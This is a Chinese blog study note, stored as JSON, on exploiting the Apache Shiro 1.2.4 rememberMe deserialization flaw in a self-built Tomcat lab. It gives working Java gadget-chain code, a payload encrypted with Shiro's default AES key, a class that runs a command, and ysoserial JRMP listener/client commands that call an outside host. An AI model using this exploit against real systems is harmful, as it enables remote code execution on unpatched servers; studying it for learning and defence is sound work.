{"title":"Java反序列化5笔记","uid":"98f7491bb751eb8b6537f6ad2a4d2b25","slug":"Java反序列化5笔记","date":"2022-09-13T14:10:58.000Z","updated":"2023-04-21T11:25:20.363Z","comments":true,"path":"api/articles/Java反序列化5笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈 15</p>\n<p><a href=\"https://t.zsxq.com/06NneiyFI\">https://t.zsxq.com/06NneiyFI</a></p>\n<p>Java Things</p>\n<p><a href=\"https://github.com/phith0n/JavaThings\">https://github.com/phith0n/JavaThings</a></p>\n<p>Orange blog文章：</p>\n<p><a href=\"http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></p>\n<p>zsx blog文章：</p>\n<p><a href=\"https://blog.zsxsoft.com/post/35\">https://blog.zsxsoft.com/post/35</a></p>\n<p>Java反序列化利用链分析shiro</p>\n<p><a href=\"https://www.anquanke.com/post/id/192619\">https://www.anquanke.com/post/id/192619</a></p>\n<h1 id=\"Shiro反序列化：\"><a href=\"#Shiro反序列化：\" class=\"headerlink\" title=\"Shiro反序列化：\"></a>Shiro反序列化：</h1><h2 id=\"Tomcat部署：\"><a href=\"#Tomcat部署：\" class=\"headerlink\" title=\"Tomcat部署：\"></a>Tomcat部署：</h2><p>下载：</p>\n<p><a href=\"https://tomcat.apache.org/\">https://tomcat.apache.org/</a></p>\n<p>解压到不带中文的路径，环境变量设置好JAVA_HOME，在解压的bin文件夹下双击setup.bat即可运行，之后在浏览器访问ip:8080即可看到tomcat页面</p>\n<p>安装8.x和9.x都不能运行，改为7.x就ok了，我的jdk是8u71</p>\n<p><a href=\"https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.56/bin/\">https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.56/bin/</a></p>\n<p>设置</p>\n<p>CATALINE_HOME： D:\\1Tomcat\\apache-tomcat-7.0.56\\</p>\n<p>CATALINE_BASE：D:\\1Tomcat\\apache-tomcat-7.0.56\\</p>\n<p>将JavaThings里面的shirodemo打包</p>\n<p>mvn package </p>\n<p>将生成的war包放到tomcat的webapps目录，在bin目录使用startup.bat启动tomcat服务，访问ip:8080/shirodemo 访问搭建的服务</p>\n<p>账号密码：root/secret</p>\n<p>打开服务本地抓包发现有问题，根本抓不到本地的数据包</p>\n<p>用靶场虚拟机去抓包，可以成功</p>\n<p>在新建一个包，将Javathings的CC6和Client0写好，添加shiro-all-1.2.4.jar插件</p>\n<p>运行Client0报错：</p>\n<p>Exception in thread “main” java.lang.NoClassDefFoundError: org/slf4j/LoggerFactory</p>\n<p>据说是因为没有下载依赖</p>\n<p>slf4j-log4j12-1.7.22.jar   slf4j-api-1.7.22.jar</p>\n<p>在<a href=\"https://nowjava.com/jar/search%E4%B8%8B%E8%BD%BD%EF%BC%8C%E6%B7%BB%E5%8A%A0%E5%88%B0eclipse%E7%9A%84build\">https://nowjava.com/jar/search下载，添加到eclipse的build</a> path里面</p>\n<p>又报错：Failed to instantiate SLF4J LoggerFactory</p>\n<p>查文档，需要删除slf4j-log4j12这个依赖，删除后有错误但是能生成payload</p>\n<p>SLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”.</p>\n<p>SLF4J: Defaulting to no-operation (NOP) logger implementation</p>\n<p>SLF4J: See <a href=\"http://www.slf4j.org/codes.html#StaticLoggerBinder\">http://www.slf4j.org/codes.html#StaticLoggerBinder</a> for further details.</p>\n<p>再查文档，发现提供了替代品</p>\n<p>slf4j-nop-1.7.2.jar</p>\n<p>slf4j-simple.jar,</p>\n<p>slf4j-log4j12.jar,</p>\n<p>slf4j-jdk14.jar</p>\n<p>logback-classic.jar </p>\n<p>下载第一个，加入依赖，perfect完美解决</p>\n<p>将生成payload作为Cookie的rememberMe发送，再tomcat的窗口回车让其显示信息，发现报错，无法加载</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/25696976/1663062764236-66b4acbd-85ff-4e7a-be97-f859f2e9c63f.png\" alt=\"img\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/25696976/1663062793728-2790c555-b86a-44af-91a1-328921bf9962.png\" alt=\"img\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/25696976/1663062818664-8954e3c3-8355-437a-aaa4-221976336d4b.png\" alt=\"img\"></p>\n<p><strong>原因：</strong></p>\n<p>org.apache.shiro.io.ClassResolvingObjectInputStream  这个类重写了其父类ObjectInputStream的resolveClass方法</p>\n<p>两者区别是子类使用 org.apache.shiro.util.ClassUtils#forName 实际上是用 org.apache.catalina.loader.ParallelWebappClassLoader#loadClass 来查找类  ，父类使用Java原生的Class.forName来找类</p>\n<p>在加载类名为 [Lorg.apache.commons.collections.Transformer;  的类出现异常</p>\n<p>通过阅读两篇文档：</p>\n<p><a href=\"https://blog.zsxsoft.com/post/35\">https://blog.zsxsoft.com/post/35</a></p>\n<p><a href=\"http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></p>\n<p>第二篇本来是这个：<a href=\"http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91\">http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91</a></p>\n<p>但是博客没了，所以找找找，在现在的第二篇的评论区发现了真正的原因</p>\n<p>Java原生的Class.forName的确不能加载数组，但是在shiro中是可以的，真实的原因是因为jdk和tomcat的classpath冲突，所以只能正常加载jdk内部的数组形式的类，而在tomcat中加载第三方就会导致找不到，只需添加tomcat启动设置，或者设置loader就行，原文没了，所以怎么设置也不知道</p>\n<p><strong>这个问题老是出现，是真的烦</strong></p>\n<h2 id=\"构造不含数组的利用链：\"><a href=\"#构造不含数组的利用链：\" class=\"headerlink\" title=\"构造不含数组的利用链：\"></a>构造不含数组的利用链：</h2><p>前面用CC6是含有Transformer数组的，所以利用不成功，现在需要找不含数组的利用链</p>\n<h3 id=\"JRMP-利用链：\"><a href=\"#JRMP-利用链：\" class=\"headerlink\" title=\"JRMP 利用链：\"></a>JRMP 利用链：</h3><p>同样是前面的第二篇文章里面提到了yso的JRMP 利用链</p>\n<p>使用URLDNS判断漏洞是否存在</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -jar ysoserial-master-SNAPSHOT.jar URLDNS http:&#x2F;&#x2F;mydnsserver.orange.tw&#x2F; | python exp.py </code></pre>\n\n<p>接着使用JRMP反弹shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 &#39;curl orange.tw&#39;</code></pre>\n\n<p># listen 一個 RMI server 走 JRMP 協議在 12345 port 上</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;1.2.3.4:12345&#39;| python exp.py </code></pre>\n\n<p># 使用 JRMPClient 去連接剛剛 listen 的 server</p>\n<h3 id=\"改造CC6：\"><a href=\"#改造CC6：\" class=\"headerlink\" title=\"改造CC6：\"></a>改造CC6：</h3><p>用 TemplatesImpl  加载字节码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">TemplatesImpl obj &#x3D; new TemplatesImpl(); \n\nsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;&quot;...bytescode&quot;&#125;); \n\nsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\nsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); obj.newTransformer();  </code></pre>\n\n<p>利用 InvokerTransformer 调用 TemplatesImpl#newTransformer 方法：  </p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(obj), \n\nnew  InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;  </code></pre>\n\n<p>但是这里也使用了数组，在这篇文中提到解决方法：</p>\n<p><a href=\"https://www.anquanke.com/post/id/192619\">https://www.anquanke.com/post/id/192619</a></p>\n<p>CC6里使用 TiedMapEntry 类，其构造参数有两个参数，前面为map，后者为key</p>\n<p>CC6时这个key是无所谓的，但是在TiedMapEntry类中给有个getValue方法，调用了</p>\n<p>map.get(key)，当这个map是LazyMap是，get方法就是触发transform的点，这个key会被传进transform()</p>\n<p>而ConstantTransformer的作用是包裹一个对象，在执行回调时返回这个对象</p>\n<p>所以，这个key可以代替ConstantTransformer</p>\n<p>创建一个InvokerTransformer来调用newTransformer方法，先传入一个无害方法，后面再替换</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Transformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);  </code></pre>\n\n<p>再修改TiedMapEntry的key为TemplatesImpl对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map innerMap &#x3D; new HashMap(); \n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformer); \n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj); \n\nMap expMap &#x3D; new HashMap(); \n\nexpMap.put(tme, &quot;valuevalue&quot;); \n\nouterMap.clear();  </code></pre>\n\n<p>使用outerMap.clear()的作用和前面outerMap.remove(“keykey”)一样</p>\n<p>p牛封装好的代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.shiroattack;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollectionsShiro &#123;\n\t public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n\n\t    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t        TemplatesImpl obj &#x3D; new TemplatesImpl();\n\t        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        Transformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);\n\n\t        Map innerMap &#x3D; new HashMap();\n\t        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformer);\n\n\t        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj);\n\n\t        Map expMap &#x3D; new HashMap();\n\t        expMap.put(tme, &quot;valuevalue&quot;);\n\n\t        outerMap.clear();\n\t        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n\t        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t        &#x2F;&#x2F; 生成序列化字符串\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(expMap);\n\t        oos.close();\n\n\t        return barr.toByteArray();\n\t    &#125;\n\n&#125;\n</code></pre>\n\n<p>Client.java生成payload的程序：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.shiroattack;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\npublic class Client &#123;\n\tpublic static void main(String []args) throws Exception &#123;\n\t\tClassPool pool &#x3D; ClassPool.getDefault();\n\t\tCtClass clazz &#x3D;\n\t\t\t\tpool.get(com.shiroattack.Evil.class.getName());\n\t\tbyte[] payloads &#x3D; new\n\t\t\t\tCommonsCollectionsShiro().getPayload(clazz.toBytecode());\n\t\tAesCipherService aes &#x3D; new AesCipherService();\n\t\tbyte[] key &#x3D;\n\t\t\t\tjava.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n\n\t\tByteSource ciphertext &#x3D; aes.encrypt(payloads, key);\n\t\tSystem.out.printf(ciphertext.toString());\n\t&#125;\n\n&#125;\n</code></pre>\n\n<p>使用的javassit是字节码操纵的第三方库，作用是将恶意类生成字节码交给TemplatesImpl</p>\n<h3 id=\"测试：\"><a href=\"#测试：\" class=\"headerlink\" title=\"测试：\"></a>测试：</h3><p>生成payload，发送数据包</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/25696976/1663067693120-f4f3cf0d-14fb-4e91-8c07-be87913201ce.png\" alt=\"img\"></p>\n<p>报错了。。。。。</p>\n<p>检测发现是恶意类的原因，我使用的是前面BECL加载的恶意类，修改成com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类那个恶意类就没有问题</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.TemplatesImplTest;\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\n&#x2F;&#x2F;必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类\npublic class HelloTemplateImplTest extends AbstractTranslet &#123;\n\tpublic void transform(DOM document, SerializationHandler[] handlers) \n\t\t\tthrows TransletException &#123;\n\t    &#125;\n\tpublic void transform(DOM document, DTMAxisIterator iterator, \n\t\t\tSerializationHandler handler) throws TransletException &#123;\n\t    &#125;\n\n\tpublic HelloTemplateImplTest () throws Exception  &#123;\n\t        super();\n\t        Runtime.getRuntime().exec(&quot;calc&quot;);\n\t    &#125;\n&#125;</code></pre>\n\n<p>有点麻烦的是需要在tomcat窗口自己手动回车才会收到响应，不影响弹计算器，实战应该没有这个问题</p>\n","text":" 参考资料：p牛 Java安全漫谈 15 https://t.zsxq.com/06NneiyFI Java Things https://github.com/phith0n/JavaThings Orange blog文章： http://blog.orange.tw/201...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A\"><span class=\"toc-text\">Shiro反序列化：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Tomcat%E9%83%A8%E7%BD%B2%EF%BC%9A\"><span class=\"toc-text\">Tomcat部署：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A0%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A\"><span class=\"toc-text\">构造不含数组的利用链：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JRMP-%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A\"><span class=\"toc-text\">JRMP 利用链：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%94%B9%E9%80%A0CC6%EF%BC%9A\"><span class=\"toc-text\">改造CC6：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%EF%BC%9A\"><span class=\"toc-text\">测试：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化6笔记","uid":"4a2c67097cc575b58a19c08f5d864189","slug":"Java反序列化6笔记","date":"2022-09-16T11:41:20.000Z","updated":"2023-04-21T11:24:13.125Z","comments":true,"path":"api/articles/Java反序列化6笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈16 https://t.zsxq.com/06JeeqbMN Java Things https://github.com/phith0n/JavaThings PriorityQueue源码分析 https://www.cnblogs.com...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化4笔记","uid":"28bef31494b30752ba9f1f07e41299e2","slug":"Java反序列化4笔记","date":"2022-09-13T14:10:44.000Z","updated":"2022-09-14T05:13:01.669Z","comments":true,"path":"api/articles/Java反序列化4笔记.json","keywords":null,"cover":null,"text":" 参考资料：p牛 Java安全漫谈 14 https://t.zsxq.com/05rjA2NJU p牛 JavaThings https://github.com/phith0n/JavaThings Common Collection3InvokerTransformerCC...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}